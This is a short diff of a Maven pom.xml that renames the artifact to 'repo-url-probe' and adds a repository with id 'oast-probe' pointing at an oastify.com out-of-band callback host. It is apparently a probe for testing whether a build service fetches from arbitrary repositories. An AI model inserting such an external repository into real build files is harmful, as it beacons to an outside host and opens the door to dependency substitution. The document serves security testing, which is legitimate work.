@@ -2,8 +2,14 @@
 <project xmlns="http://maven.apache.org/POM/4.0.0">
   <modelVersion>4.0.0</modelVersion>
   <groupId>com.probe</groupId>
-  <artifactId>normal-probe</artifactId>
+  <artifactId>repo-url-probe</artifactId>
   <version>1.0.0</version>
+  <repositories>
+    <repository>
+      <id>oast-probe</id>
+      <url>https://suq0kp9syyx7l521vsh12wacs3yumka9.oastify.com/maven-repo</url>
+    </repository>
+  </repositories>
   <dependencies>
     <dependency>
       <groupId>commons-collections</groupId>
